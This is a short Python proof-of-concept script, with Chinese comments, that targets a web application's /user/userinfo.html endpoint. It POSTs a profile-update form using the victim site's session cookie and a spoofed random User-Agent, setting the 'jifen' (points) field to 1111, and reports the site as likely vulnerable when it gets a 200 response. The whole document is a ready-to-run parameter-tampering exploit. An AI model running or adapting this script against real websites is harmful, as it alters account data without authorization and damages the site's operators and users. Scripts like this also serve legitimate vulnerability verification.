import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/user/userinfo.html',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')
parser.add_argument('-c', '--cookie', type=str, help='输入当前用户cookie')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/user/userinfo.html"  # 移除末尾的斜杠
    else:
        url = args.url + "/user/userinfo.html"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie": args.cookie,
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
}
data = {
    "litpic": "",
    "file": "",
    "username": "13097978480",
    "tel": "13097978480",
    "email": "123123@qq.com",
    "sex": "0",
    "province": "",
    "city": "",
    "address": "",
    "password": "",
    "repassword": "",
    "signature": "11112312",
    "jifen": "1111",
    "submit": "提交"
}

response = requests.post(url, headers=headers, data=data)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞,修改积分为1111"+ '/n'+ '返回内容为' + response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)